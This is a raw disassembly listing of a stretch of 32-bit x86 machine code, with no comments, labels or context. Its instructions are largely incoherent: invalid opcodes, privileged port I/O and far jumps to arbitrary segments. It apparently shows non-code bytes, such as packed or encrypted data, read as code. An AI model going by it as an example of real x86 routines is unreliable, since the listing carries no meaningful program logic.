  416d70:	lea    esi,[edx+ebx*1-0x19a9525b]
  416d77:	(bad)  
  416d78:	pop    ss
  416d79:	sbb    BYTE PTR [eax-0x4dee87b4],0x86
  416d80:	fadd   DWORD PTR [esi-0x78]
  416d83:	adc    esi,edx
  416d85:	std    
  416d86:	dec    ebx
  416d87:	int    0x35
  416d89:	popa   
  416d8a:	aaa    
  416d8b:	mov    BYTE PTR [eax+0x35],bl
  416d8e:	cli    
  416d8f:	xor    edi,edi
  416d91:	adc    eax,0xa50ee2c9
  416d96:	cmp    DWORD PTR [ebx],edi
  416d98:	pop    ds
  416d99:	fbld   TBYTE PTR [edi]
  416d9b:	fisub  WORD PTR [ebx-0x3d]
  416d9e:	nop
  416d9f:	mov    ds,WORD PTR [edx]
  416da1:	jae    0x416df8
  416da3:	dec    ebx
  416da4:	out    0x64,eax
  416da6:	xor    BYTE PTR [ebx],dh
  416da8:	mov    edx,0xfcb76830
  416dad:	mov    dl,0xe4
  416daf:	scas   eax,DWORD PTR es:[edi]
  416db0:	pop    edi
  416db1:	stos   DWORD PTR es:[edi],eax
  416db2:	loop   0x416da9
  416db4:	mov    edx,0xf4f32b4
  416db9:	scas   al,BYTE PTR es:[edi]
  416dba:	inc    ebp
  416dbb:	mov    ebp,0xe30f41a5
  416dc0:	sbb    al,0x22
  416dc2:	pusha  
  416dc3:	mov    esi,0x5bd1e52d
  416dc8:	int3   
  416dc9:	repnz and BYTE PTR [edi-0x59],0x17
  416dce:	xchg   esi,eax
  416dcf:	fstp   DWORD PTR [edx-0x6b]
  416dd2:	mov    esi,0xde80b610
  416dd7:	sbb    al,0x42
  416dd9:	aam    0xc7
  416ddb:	fsubr  QWORD PTR [edi+ecx*1+0x620c53d9]
  416de2:	inc    ebx
  416de3:	xor    DWORD PTR [eax],edi
  416de5:	test   eax,0x97672d2a
  416dea:	jb     0x416e57
  416dec:	pushf  
  416ded:	mov    ebp,ss
  416def:	push   0xbf91be08
  416df4:	cdq    
  416df5:	xor    eax,0xe5e9331d
  416dfa:	iret   
  416dfb:	call   DWORD PTR [ecx]
  416dfd:	stos   DWORD PTR es:[edi],eax
  416dfe:	(bad)  
  416e00:	pop    es
  416e01:	(bad)  
  416e02:	test   BYTE PTR [edi+0x5e],ch
  416e05:	adc    al,0xb9
  416e07:	das    
  416e08:	mov    ch,0xd2
  416e0a:	test   BYTE PTR [edi+0x0],ch
  416e0d:	xor    al,0x1b
  416e0f:	out    0x20,eax
  416e11:	push   0xe844925e
  416e16:	leave  
  416e17:	imul   ebp,DWORD PTR [edi],0x25
  416e1a:	and    DWORD PTR [edx],0x2d3ee125
  416e20:	clc    
  416e21:	stos   BYTE PTR es:[edi],al
  416e22:	lahf   
  416e23:	fs scas eax,DWORD PTR es:[edi]
  416e25:	pop    ecx
  416e26:	jp     0x416da9
  416e28:	pop    ebp
  416e29:	ja     0x416de8
  416e2b:	xchg   ebx,eax
  416e2c:	dec    ebp
  416e2d:	pop    esp
  416e2e:	je     0x416de0
  416e30:	mov    DWORD PTR ds:0xa4c24764,edi
  416e36:	sbb    ecx,DWORD PTR [ecx]
  416e38:	push   0xffffffb4
  416e3a:	das    
  416e3b:	pop    ebp
  416e3c:	iret   
  416e3d:	mov    cl,0x8c
  416e3f:	mov    al,ds:0xc8af0587
  416e44:	jno    0x416ebb
  416e46:	std    
  416e47:	pop    ss
  416e48:	xchg   esp,eax
  416e49:	xchg   esp,eax
  416e4a:	cli    
  416e4b:	mov    edi,0xa0fc18ae
  416e50:	test   DWORD PTR [ebx+eiz*1-0x73a10e2],ebx
  416e57:	leave  
  416e58:	jnp    0x416e0f
  416e5a:	and    eax,0x85ce0c97
  416e5f:	test   DWORD PTR [ebx+0x5211d4f0],ebx
  416e65:	add    ch,BYTE PTR [ecx-0x52]
  416e68:	retf   0xa11d
  416e6b:	test   DWORD PTR [eax-0x1e],ebx
  416e6e:	addr16 imul ebx,eax,0x7b85f353
  416e75:	test   al,0xb2
  416e77:	mov    ah,0x2f
  416e79:	xor    ch,al
  416e7b:	ret    
  416e7c:	std    
  416e7d:	and    BYTE PTR [edi+0x589fda1],0x2a
  416e84:	add    ebp,DWORD PTR [ebx-0x25]
  416e87:	cli    
  416e88:	ds gs or esi,0x7b72ce0b
  416e90:	mov    ds:0x481054e,al
  416e95:	push   eax
  416e96:	sub    eax,0xe56b5f2c
  416e9b:	add    eax,0x9b1bbf49
  416ea0:	in     eax,0xf0
  416ea2:	stos   BYTE PTR es:[edi],al
  416ea3:	pop    es
  416ea4:	test   BYTE PTR [edx+0x267b44a4],ch
  416eaa:	test   DWORD PTR [ecx+eiz*8],ebp
  416ead:	lods   eax,DWORD PTR ds:[esi]
  416eae:	fidivr DWORD PTR [edx-0x75eb29a3]
  416eb4:	inc    edx
  416eb5:	xor    eax,0x792a1da1
  416eba:	cmp    BYTE PTR [edx],ah
  416ebc:	jp     0x416f34
  416ebe:	jp     0x416e73
  416ec0:	or     BYTE PTR [ecx-0x2acebafd],dl
  416ec6:	(bad)  
  416ec7:	pop    edx
  416ec8:	cmp    DWORD PTR [eax+0x37c2192a],0xffffffea
  416ecf:	cdq    
  416ed0:	cwde   
  416ed1:	sbb    edi,0x2b14632d
  416ed7:	jge    0x416ebc
  416ed9:	fcom   QWORD PTR [edi+eax*4]
  416edc:	pop    esi
  416edd:	fwait
  416ede:	mov    dl,0xb
  416ee0:	and    DWORD PTR [edi+ebp*2-0x66],ecx
  416ee4:	(bad)  
  416ee5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ee6:	sub    DWORD PTR [edx],edx
  416ee8:	bound  edx,QWORD PTR [esi+0x12c6d82a]
  416eee:	cmpxchg DWORD PTR [eax-0x386ee3d0],esp
  416ef5:	(bad)  
  416ef6:	out    0x20,al
  416ef8:	and    eax,0x3c5ecd84
  416efd:	call   0xe9cf:0x57ea2933
  416f04:	jns    0x416ed6
  416f06:	out    0xff,al
  416f08:	call   0xf5ef:0x3b48e31a
  416f0f:	mov    DWORD PTR [ecx+edi*4],0xe5127eba
  416f16:	sbb    edx,ebx
  416f18:	push   esi
  416f19:	push   edi
  416f1a:	aad    0x2b
  416f1c:	inc    eax
  416f1d:	add    cl,BYTE PTR [edx+0x4a]
  416f20:	icebp  
  416f21:	sbb    edi,esp
  416f23:	mov    dl,0x56
  416f25:	int3   
  416f26:	ins    DWORD PTR es:[edi],dx
  416f27:	not    DWORD PTR [eax]
  416f29:	sub    eax,0xe6b57972
  416f2e:	mov    bl,0xc5
  416f30:	(bad)  
  416f31:	outs   dx,DWORD PTR ds:[esi]
  416f32:	push   ebp
  416f33:	cmc    
  416f34:	inc    ebx
  416f35:	cmc    
  416f36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f37:	sti    
  416f38:	fwait
  416f39:	push   0x4dd4c172
  416f3e:	aad    0xb
  416f40:	lock jnp 0x416f42
  416f43:	rcl    DWORD PTR ss:[ebx],0xe7
  416f47:	inc    ebx
  416f48:	xchg   DWORD PTR [esi*8+0x40a6799e],edi
  416f4f:	stos   BYTE PTR es:[edi],al
  416f50:	not    BYTE PTR [esi+0x7f]
  416f53:	test   dl,cl
  416f55:	stc    
  416f56:	fidiv  DWORD PTR [edx-0x1e9011a5]
  416f5c:	outs   dx,BYTE PTR ds:[esi]
  416f5d:	and    esp,eax
  416f5f:	repnz outs dx,DWORD PTR ds:[esi]
  416f61:	loopne 0x416f71
  416f63:	aas    
  416f64:	xchg   esi,eax
  416f65:	cmp    ah,BYTE PTR [edi-0x26]
  416f68:	push   ds
  416f69:	cmp    bl,BYTE PTR [edx-0x6182a42e]
  416f6f:	sbb    al,0xa2
  416f71:	mov    dh,0x31
  416f73:	retf   
  416f74:	fldcw  WORD PTR [ecx+edi*1-0x7c21a4dc]
  416f7b:	mov    al,0xe7
  416f7d:	retf   
  416f7e:	push   ss
  416f7f:	aad    0xd5
  416f81:	test   DWORD PTR [edi+0x14c085e6],ebx
  416f87:	idiv   bl
  416f89:	aam    0x68
  416f8b:	jb     0x416fdd
  416f8d:	es aaa 
  416f8f:	xchg   ecx,eax
  416f90:	nop
  416f91:	cli    
  416f92:	xchg   ecx,eax
  416f93:	xchg   ebx,eax
  416f94:	jae    0x416fea
  416f96:	add    eax,0x24a4c150
  416f9b:	fisub  DWORD PTR [esi+0x2f15fc48]
  416fa1:	add    BYTE PTR [esi+0x73],ah
  416fa4:	pop    es
  416fa5:	loope  0x416fd6
  416fa7:	outs   dx,BYTE PTR ds:[esi]
  416fa8:	xchg   ebx,eax
  416fa9:	stos   DWORD PTR es:[edi],eax
  416faa:	jge    0x416f8a
  416fac:	out    0x94,al
  416fae:	add    al,0xea
  416fb0:	ss lahf 
  416fb2:	push   ds
  416fb3:	test   ecx,edi
  416fb5:	mov    bh,cl
  416fb7:	mov    bh,0x7a
  416fb9:	inc    esp
  416fba:	and    DWORD PTR [ebp-0x6b],0x3
  416fbe:	cmp    BYTE PTR [edi],ch
  416fc0:	jle    0x416fec
  416fc2:	sar    BYTE PTR [edi+eax*8+0xfbf6d2e],cl
  416fc9:	sbb    cl,BYTE PTR [esi]
  416fcb:	and    ebx,edi
  416fcd:	mov    WORD PTR [ebx],ss
  416fcf:	shl    DWORD PTR [ebp+0x7a],0x4d
  416fd3:	push   0x5a
  416fd5:	mov    DWORD PTR [ecx],eax
  416fd7:	les    ebx,FWORD PTR [ebp+0x2a]
  416fda:	adc    BYTE PTR [edi+0x52a4f673],0x89
  416fe1:	dec    edi
  416fe2:	cmp    al,cl
  416fe4:	or     BYTE PTR [eax+0x6c5112f7],al
  416fea:	pop    esp
  416feb:	add    al,al
  416fed:	in     eax,0x31
  416fef:	push   ecx
  416ff0:	and    edi,DWORD PTR [eax]
  416ff2:	aas    
  416ff3:	loope  0x416f8d
  416ff5:	loop   0x416ff6
  416ff7:	clc    
  416ff8:	in     eax,dx
  416ff9:	into   
  416ffa:	cli    
  416ffb:	das    
  416ffc:	out    0xcd,al
  416ffe:	xchg   ebx,eax
  416fff:	sub    BYTE PTR [eax],dh
  417001:	in     eax,0x20
  417003:	loope  0x417079
  417005:	jmp    0xfe91:0x8fd4901c
  41700c:	daa    
  41700d:	js     0x41707a
  41700f:	(bad)  
  417010:	call   edx
  417012:	mul    esp
  417014:	jb     0x417000
  417016:	test   eax,0xf9b45d51
  41701b:	ins    DWORD PTR es:[edi],dx
  41701c:	dec    edi
  41701d:	mov    DWORD PTR [ebx+0x6d],0xbb02b8da
  417024:	dec    esp
  417025:	rcr    DWORD PTR [edi+0x78b8a2ee],0x39
  41702c:	adc    ch,dl
  41702e:	adc    eax,0x937aa3ef
  417033:	and    eax,0x95eee833
  417038:	fsubr  DWORD PTR ss:[ecx]
  41703b:	cmp    edi,DWORD PTR [eax+0x2fdd5af0]
  417041:	ss ret 
  417043:	cmc    
  417044:	aas    
  417045:	jb     0x4170ad
  417047:	push   esi
  417048:	adc    al,0xfe
  41704a:	dec    edi
  41704b:	sub    al,0xb8
  41704d:	ja     0x417092
  41704f:	mov    ds:0xdf1b1feb,al
  417054:	lds    esi,FWORD PTR [ebx+0x7edb76d8]
  41705a:	or     ebx,esp
  41705c:	pop    edx
  41705d:	xchg   edi,eax
  41705e:	imul   esp,eax,0x59427871
  417064:	imul   ebx,DWORD PTR [edi+edi*1+0x5a0a592],0x452315be
  41706f:	mov    dl,0xed
  417071:	push   esp
  417072:	jp     0x41703b
  417074:	mov    dl,BYTE PTR [ebp+0x48]
  417077:	cmp    ch,dl
  417079:	xor    al,0x8f
  41707b:	icebp  
  41707c:	(bad)  
  41707d:	ins    BYTE PTR es:[edi],dx
  41707e:	push   0x469190ea
  417083:	xchg   esp,eax
  417084:	pop    esp
  417085:	xor    eax,0xc0d46771
  41708a:	in     eax,0xc8
  41708c:	push   eax
  41708d:	test   al,0x9d
  41708f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417090:	xchg   ecx,eax
  417091:	cs and eax,0xec2e9026
  417097:	retf   
  417098:	ins    BYTE PTR es:[edi],dx
  417099:	jae    0x4170ff
  41709b:	lods   al,BYTE PTR ds:[esi]
  41709c:	push   ebx
  41709d:	jecxz  0x41702b
  41709f:	add    al,0x7b
  4170a1:	daa    
  4170a2:	adc    DWORD PTR [ebp+0x55],ecx
  4170a5:	xlat   BYTE PTR ds:[ebx]
  4170a6:	das    
  4170a7:	xor    BYTE PTR [ebx],dh
  4170a9:	cvttps2pi mm2,xmm1
  4170ac:	outs   dx,BYTE PTR ds:[esi]
  4170ad:	inc    ebx
  4170ae:	adc    ebp,edx
  4170b0:	imul   ecx,eax,0xffffffb2
  4170b3:	mov    esi,0x669bbe46
  4170b8:	add    BYTE PTR [ebx+0x181ed0fd],bh
  4170be:	test   al,0x5f
  4170c0:	xor    eax,0xbe897a26
  4170c5:	mov    ch,0xce
  4170c7:	sti    
  4170c8:	mov    edi,0x2fd1f2b4
  4170cd:	push   esp
  4170ce:	rcl    eax,cl
  4170d0:	div    DWORD PTR [eax+0x4bf7964d]
  4170d6:	jl     0x417070
  4170d8:	pusha  
  4170d9:	dec    esi
  4170da:	mov    ebx,ebx
  4170dc:	jae    0x41708d
  4170de:	push   edi
  4170df:	pop    ebp
  4170e0:	or     edx,DWORD PTR [edx+0x70]
  4170e3:	sahf   
  4170e4:	mov    eax,0xc113ce7d
  4170e9:	push   edi
  4170ea:	test   al,0xbd
  4170ec:	sub    edi,DWORD PTR [edi-0x2a3af7ad]
  4170f2:	jg     0x417075
  4170f4:	cmp    BYTE PTR [esp+eax*4],dh
  4170f7:	mov    al,0x68
  4170f9:	cld    
  4170fa:	stos   BYTE PTR es:[edi],al
  4170fb:	in     al,0x44
  4170fd:	shl    DWORD PTR [ebp-0x4ddbebf5],0xec
  417104:	inc    DWORD PTR [ecx]
  417106:	arpl   WORD PTR [edx-0x547b8ae6],si
  41710c:	je     0x417090
  41710e:	fwait
  41710f:	out    0x50,al
  417111:	neg    BYTE PTR [edx-0x58f16d71]
  417117:	imul   edx,eax,0x72207305
  41711d:	(bad)  
  41711e:	aam    0x16
  417120:	lock or eax,0x23226c0c
  417126:	retf   
  417127:	xchg   esp,eax
  417128:	(bad)  
  41712a:	test   eax,0x29bfe7f1
  41712f:	sbb    eax,0x905de10
  417134:	stos   BYTE PTR es:[edi],al
  417135:	rcl    DWORD PTR [ebx+0x52],cl
  417138:	js     0x417174
  41713a:	mov    ah,0x23
  41713c:	retf   
  41713d:	sbb    bh,0x10
  417140:	or     DWORD PTR [edx-0x67],0xffffffad
  417144:	cmc    
  417145:	fcom   QWORD PTR [ecx-0x13]
  417148:	fistp  QWORD PTR [ecx-0x562b37ac]
  41714e:	xor    ch,dl
  417150:	dec    edx
  417151:	push   es
  417152:	int    0x1c
  417154:	dec    edi
  417155:	js     0x4170ed
  417157:	bound  ecx,QWORD PTR [edx+0x20]
  41715a:	xchg   ebp,eax
  41715b:	lahf   
  41715c:	cli    
  41715d:	cmp    BYTE PTR [esi+0xdf4d2e7],ch
  417163:	jge    0x417156
  417165:	fisubr WORD PTR [eax+0x5839fe2c]
  41716b:	push   ecx
  41716c:	test   DWORD PTR [edi+edi*4-0x59f36570],0x96cb3ea2
  417177:	std    
  417178:	(bad)  
  417179:	jne    0x4171cb
  41717b:	inc    esp
  41717c:	xchg   ecx,eax
  41717d:	xor    al,0xf5
  41717f:	push   ebx
  417180:	sbb    BYTE PTR [ebp-0x17],bl
  417183:	cmp    eax,0x3d79baa
  417188:	jae    0x417138
  41718a:	push   ds
  41718b:	mov    bh,0xc2
  41718d:	test   DWORD PTR [edx+0x34],esp
  417190:	sti    
  417191:	dec    eax
  417192:	out    dx,eax
  417193:	xor    dh,dh
  417195:	pop    ds
  417196:	addr16 adc al,0x7
  417199:	ja     0x41717a
  41719b:	sub    eax,0x623884fe
  4171a0:	or     ebp,DWORD PTR [eax]
  4171a2:	cld    
  4171a3:	xchg   edx,eax
  4171a4:	iret   
  4171a5:	js     0x4171c8
  4171a7:	out    0x2d,eax
  4171a9:	and    DWORD PTR [eax+ebx*2],ecx
  4171ac:	xor    ch,0x9b
  4171af:	out    dx,eax
  4171b0:	dec    edx
  4171b1:	(bad)  
  4171b3:	pop    edi
  4171b4:	jl     0x417191
  4171b6:	sbb    eax,0x9a1c1394
  4171bb:	jle    0x4171b0
  4171bd:	shl    BYTE PTR [edx],cl
  4171bf:	stos   BYTE PTR es:[edi],al
  4171c0:	cmp    esp,DWORD PTR [edx+0x63296977]
  4171c6:	stc    
  4171c7:	and    cl,BYTE PTR [edx-0x1b]
  4171ca:	add    edx,ebp
  4171cc:	pop    es
  4171cd:	jp     0x4171eb
  4171cf:	pushf  
  4171d0:	dec    ebp
  4171d1:	mov    DWORD PTR [edi-0x66],eax
  4171d4:	jnp    0x41716e
  4171d6:	mov    edx,0x7bd57237
  4171db:	mov    cl,0x71
  4171dd:	imul   eax,DWORD PTR [edx+0x847ba48],0x7f6617a8
  4171e7:	adc    BYTE PTR [esi-0x43],ch
  4171ea:	jg     0x41718b
  4171ec:	ror    DWORD PTR [ebx],0x13
  4171ef:	ret    0xe567
  4171f2:	sub    BYTE PTR [eax+0x48],al
  4171f5:	jb     0x417257
  4171f7:	jo     0x417197
  4171f9:	fwait
  4171fa:	out    dx,eax
  4171fb:	cmp    BYTE PTR [ebx+ebp*4+0x7779964f],bh
  417202:	jne    0x417226
  417204:	in     eax,dx
  417205:	jp     0x41719e
  417207:	std    
  417208:	pop    edx
  417209:	aaa    
  41720a:	mov    edi,0xb23876b3
  41720f:	mov    esi,0xdb1ddc95
  417214:	les    edx,FWORD PTR [ecx+0x1]
  417217:	mov    ds:0x5d343b84,eax
  41721c:	lods   al,BYTE PTR ds:[esi]
  41721d:	shr    DWORD PTR [edx],1
  41721f:	sub    DWORD PTR [edx-0x3f79e7dc],esp
  417225:	jo     0x417244
  417227:	push   ds
  417228:	stos   BYTE PTR es:[edi],al
  417229:	dec    ebx
  41722a:	(bad)  
  41722b:	xor    DWORD PTR [ebp-0x37],edi
  41722e:	jge    0x41726a
  417230:	lea    esi,[ebx+0x1e]
  417233:	xor    eax,eax
  417235:	hlt    
  417236:	jle    0x4171c5
  417238:	mov    edi,0x532563cd
  41723d:	cmp    edi,DWORD PTR [esi-0x17ccfdd0]
  417243:	jmp    0x5b8f2b
  417248:	xchg   edx,eax
  417249:	and    BYTE PTR [esi],al
  41724b:	fwait
  41724c:	pop    ebx
  41724d:	leave  
  41724e:	ins    BYTE PTR es:[edi],dx
  41724f:	stos   DWORD PTR es:[edi],eax
  417250:	aam    0x9c
  417252:	inc    ebp
  417253:	popf   
  417254:	jmp    0xe0d0:0x1aa42c3
  41725b:	data16 das 
  41725d:	dec    ebp
  41725e:	adc    dh,al
  417260:	cmp    DWORD PTR [ebx+0x3],ebx
  417263:	push   ss
  417264:	icebp  
  417265:	ds mov al,0x75
  417268:	mov    BYTE PTR [esi-0x3bc64870],bh
  41726e:	arpl   WORD PTR [ecx],bp
  417270:	xor    al,0x38
  417272:	sar    DWORD PTR [ecx-0x40],cl
  417275:	lods   eax,DWORD PTR ds:[esi]
  417276:	push   ebp
  417277:	mov    ds:0xbd22aeee,eax
  41727c:	mov    eax,ds:0x12cf594d
  417281:	(bad)  
  417282:	sub    eax,0x49d97ab2
  417287:	push   esi
  417288:	push   edi
  417289:	clc    
  41728a:	or     BYTE PTR [ecx],0x4e
  41728d:	push   edi
  41728e:	sbb    DWORD PTR ds:[ecx-0x11505607],0xffffffac
  417296:	shl    DWORD PTR ds:0x4ac01d20,cl
  41729c:	cmp    DWORD PTR [edi-0x2b],esp
  41729f:	jge    0x41729a
  4172a1:	dec    edx
  4172a2:	cmp    bl,BYTE PTR [edi+0xaadbef3]
  4172a8:	outs   dx,BYTE PTR ds:[esi]
  4172a9:	sub    al,0xc2
  4172ab:	test   BYTE PTR [esp+eax*4-0x59],ch
  4172af:	cmc    
  4172b0:	lds    esi,FWORD PTR [ecx+0x4e]
  4172b3:	mov    dh,0x12
  4172b5:	fild   WORD PTR [esi]
  4172b7:	dec    esi
  4172b8:	jmp    0x37de:0x4101aad2
  4172bf:	inc    ecx
  4172c0:	mov    cl,0x11
  4172c2:	scas   al,BYTE PTR es:[edi]
  4172c3:	fistp  DWORD PTR [esi-0x60930c68]
  4172c9:	inc    ebp
  4172ca:	enter  0xc5a1,0x65
  4172ce:	adc    dl,BYTE PTR [esi-0x28]
  4172d1:	xchg   bh,bl
  4172d3:	sar    BYTE PTR [edx+0x33],0x3a
  4172d7:	xlat   BYTE PTR ds:[ebx]
  4172d8:	mov    bl,cl
  4172da:	addr16 out 0xe5,eax
  4172dd:	lods   eax,DWORD PTR ds:[esi]
  4172de:	push   0xffffff9b
  4172e0:	mov    esp,0x61d89a69
  4172e5:	mov    DWORD PTR [edx],ecx
  4172e7:	mov    ds:0x5d363690,eax
  4172ec:	mov    ecx,0x822b7eee
  4172f1:	std    
  4172f2:	stc    
  4172f3:	fs pop esi
  4172f5:	jno    0x417348
  4172f7:	add    BYTE PTR [ebp+0x14d00844],dl
  4172fd:	jmp    0xfb21:0x8e03698e
  417304:	and    bl,BYTE PTR [ebx-0x3f]
  417307:	retf   0xa907
  41730a:	lea    ebp,[edi]
  41730c:	xor    BYTE PTR [esp+eiz*2+0x2a4379de],al
  417313:	xchg   edi,eax
  417314:	or     bh,BYTE PTR [ebx]
  417316:	sbb    eax,0xd2abbb2b
  41731b:	fldenv [edi-0x26fb5d7f]
  417321:	push   es
  417322:	es and eax,0xd5672652
  417328:	lea    ebp,[esp+edi*2]
  41732b:	popa   
  41732c:	sbb    BYTE PTR [ecx-0x42],cl
  41732f:	cmp    al,0xd
  417331:	or     BYTE PTR [ebp-0x66b1982],al
  417337:	jb     0x41737c
  417339:	popf   
  41733a:	scas   al,BYTE PTR es:[edi]
  41733b:	jecxz  0x41738e
  41733d:	sbb    al,0xec
  41733f:	jo     0x417341
  417341:	imul   ebx,DWORD PTR [edi+0x12809c80],0xffffffc7
  417348:	sbb    al,0x88
  41734a:	lea    eax,[eax]
  41734c:	xchg   BYTE PTR [ecx+0x56cb2b00],cl
  417352:	mov    ds:0x7cb3cd67,al
  417357:	outs   dx,BYTE PTR ds:[esi]
  417358:	pop    ecx
  417359:	cmp    eax,0x14b79d57
  41735e:	xor    BYTE PTR [esi+ebx*1],cl
  417361:	pop    ss
  417362:	add    BYTE PTR [esi],al
  417364:	nop
  417365:	icebp  
  417366:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417367:	cmp    edi,ecx
  417369:	pop    edx
  41736a:	int3   
  41736b:	pop    edx
  41736c:	mov    bh,0x86
  41736e:	mov    ebx,0xe744112c
  417373:	aaa    
  417374:	imul   ebx,DWORD PTR [eax-0x205111af],0x34632ca4
  41737e:	mov    al,0xf3
  417380:	mov    esi,0x40952872
  417385:	jmp    0x417353
  417387:	mov    esi,0x48fbab54
  41738c:	push   esp
  41738d:	sub    cl,dl
  41738f:	mov    ah,0x3
  417391:	(bad)  
  417393:	aam    0x1a
  417395:	push   esp
  417396:	mov    ecx,0xc5d603b1
  41739b:	cmp    al,0x55
  41739d:	lea    esp,[eax-0x92a889d]
  4173a3:	jo     0x41741d
  4173a5:	cmp    cl,BYTE PTR [ebx+0x7e]
  4173a8:	add    dl,BYTE PTR [ecx+0x4a]
  4173ab:	mov    ecx,esp
  4173ad:	lods   al,BYTE PTR ds:[esi]
  4173ae:	ds cld 
  4173b0:	imul   ebp,DWORD PTR [eax+eiz*1-0x4ff61ead],0xdea03cbe
  4173bb:	ja     0x41742a
  4173bd:	loopne 0x41736a
  4173bf:	in     al,dx
  4173c0:	sub    al,BYTE PTR [esi-0x701ce7b5]
  4173c6:	mov    cl,0x92
  4173c8:	dec    esp
  4173c9:	xchg   edi,eax
  4173ca:	out    0x9,eax
  4173cc:	push   edi
  4173cd:	jo     0x417385
  4173cf:	sahf   
  4173d0:	inc    ecx
  4173d1:	or     eax,0x79cef5a5
  4173d6:	adc    BYTE PTR [esi-0x65],ah
  4173d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173da:	mov    bh,0xc0
  4173dc:	and    bh,bl
  4173de:	ret    0xa3fe
  4173e1:	je     0x4173e8
  4173e3:	jns    0x417428
  4173e5:	push   ecx
  4173e6:	dec    edi
  4173e7:	pop    ds
  4173e8:	into   
  4173e9:	fimul  DWORD PTR [eax+0x40316df3]
  4173ef:	mov    BYTE PTR [eax],dl
  4173f1:	sbb    bh,BYTE PTR ds:0x6babd5cd
  4173f7:	outs   dx,DWORD PTR ds:[esi]
  4173f8:	sahf   
  4173f9:	pop    eax
  4173fa:	mov    ds:0xecae8a97,eax
  4173ff:	pusha  
  417400:	sub    bh,BYTE PTR [edi]
  417402:	jne    0x41747a
  417404:	(bad)  
  417406:	push   eax
  417407:	add    al,0x4c
  417409:	daa    
  41740a:	push   cs
  41740b:	mov    eax,0xf22129b5
  417410:	popf   
  417411:	pop    edx
  417412:	sti    
  417413:	lea    ebx,[esi+0x5b]
  417416:	jns    0x4173c6
  417418:	call   0x25db4c0a
  41741d:	xlat   BYTE PTR ds:[ebx]
  41741e:	ins    BYTE PTR es:[edi],dx
  41741f:	mov    edi,0xb4ba7c98
  417424:	out    0x94,eax
  417426:	jle    0x4173d0
  417428:	push   ebp
  417429:	mov    ecx,0xbc735ca8
  41742e:	mov    ebp,0x1b2f6f0a
  417433:	push   0x76bf7c59
  417438:	sub    bl,BYTE PTR [esi]
  41743a:	jp     0x41746f
  41743c:	out    0x59,al
  41743e:	aas    
  41743f:	pop    esp
  417440:	lock ins BYTE PTR es:[edi],dx
  417442:	scas   al,BYTE PTR es:[edi]
  417443:	gs jecxz 0x4173fe
  417446:	sub    edi,DWORD PTR [ebp+0x90ee5e0]
  41744c:	add    al,0x5b
  41744e:	push   ss
  41744f:	push   ebp
  417450:	push   0xb1cec3f3
  417455:	sub    al,0x1b
  417457:	aad    0x62
  417459:	add    eax,0x5e714ed2
  41745e:	xlat   BYTE PTR ds:[ebx]
  41745f:	pop    esi
  417460:	neg    DWORD PTR [edi-0x69b29c2]
  417466:	(bad)  
  417467:	mov    ecx,0x766b4e4c
  41746c:	pop    esi
  41746d:	cmp    al,0xa5
  41746f:	cmp    BYTE PTR [ecx+ebx*4-0x2be556fe],0xb5
  417477:	call   0x8429:0xb2c8a786
  41747e:	add    edx,DWORD PTR [eax]
  417480:	adc    ecx,DWORD PTR [edx+0x63]
  417483:	cvtps2pi mm3,QWORD PTR [edx+ecx*2]
  417487:	push   ebp
  417488:	ret    0x8c8f
  41748b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41748c:	stc    
  41748d:	pop    edi
  41748e:	test   al,0x4f
  417490:	mov    bh,0x2
  417492:	mov    ecx,0x4a3ce331
  417497:	mov    ecx,0x5387fb0a
  41749c:	push   ebx
  41749d:	mov    cl,cl
  41749f:	jb     0x4174e2
  4174a1:	inc    edx
  4174a2:	outs   dx,DWORD PTR ds:[esi]
  4174a3:	adc    al,0x3c
  4174a5:	sbb    DWORD PTR [edi-0x38],edi
  4174a8:	pop    ss
  4174a9:	xchg   BYTE PTR [ebx],ah
  4174ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174ac:	arpl   WORD PTR [edx+0x42],si
  4174af:	and    BYTE PTR [eax-0x41],dl
  4174b2:	jnp    0x417498
  4174b4:	sub    eax,0x9da64556
  4174b9:	mov    al,ds:0xab59c31b
  4174be:	adc    al,BYTE PTR [ebp+0x3a82624d]
  4174c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174c5:	mov    bl,0xc8
  4174c7:	gs sbb al,bl
  4174ca:	push   ebx
  4174cb:	xchg   edi,eax
  4174cc:	inc    ebp
  4174cd:	enter  0x50fa,0xdc
  4174d1:	push   cs
  4174d2:	mov    esi,ecx
  4174d4:	repnz cmc 
  4174d6:	mov    bl,0x11
  4174d8:	sbb    eax,0xccec072
  4174dd:	dec    eax
  4174de:	lds    edx,FWORD PTR [eax]
  4174e0:	int    0xc3
  4174e2:	xor    BYTE PTR [edx-0x2430994a],cl
  4174e8:	xchg   ebx,eax
  4174e9:	xor    eax,0xe4232453
  4174ee:	stos   BYTE PTR es:[edi],al
  4174ef:	imul   esi,DWORD PTR [edi+0x58731bbe],0xffffffd7
  4174f6:	out    0xf6,eax
  4174f8:	ret    0x27c8
  4174fb:	cld    
  4174fc:	sub    eax,0x4c7dd628
  417501:	xchg   ebp,eax
  417502:	in     eax,dx
  417503:	enter  0xbf5b,0x3b
  417507:	pop    ds
  417508:	push   0xffffffd9
  41750a:	pop    edi
  41750b:	pop    eax
  41750c:	stos   BYTE PTR es:[edi],al
  41750d:	fsub   DWORD PTR [edi]
  41750f:	in     al,dx
  417510:	jno    0x417532
  417512:	mov    bh,al
  417514:	mov    cl,0xa9
  417516:	or     ah,BYTE PTR [eax+ebp*2-0x7e]
  41751a:	jns    0x4174aa
  41751c:	mov    ebp,0xf76895ec
  417521:	lea    ecx,[esi-0x4b]
  417524:	jno    0x4174cc
  417526:	ret    
  417527:	stos   BYTE PTR es:[edi],al
  417528:	cld    
  417529:	or     edi,DWORD PTR [edi-0x77226fc0]
  41752f:	add    ebx,esi
  417531:	sub    ebp,DWORD PTR [eax+0x4b]
  417534:	(bad)  
  417535:	inc    eax
  417536:	pop    edx
  417537:	dec    edx
  417538:	fld    DWORD PTR [ecx-0x774ec009]
  41753e:	or     bh,BYTE PTR ds:0xefdaba01
  417544:	lods   eax,DWORD PTR ds:[esi]
  417545:	call   0x1167:0x78172d50
  41754c:	(bad)  
  41754d:	ins    BYTE PTR es:[edi],dx
  41754e:	adc    DWORD PTR [ecx+0x7d6e71a9],esp
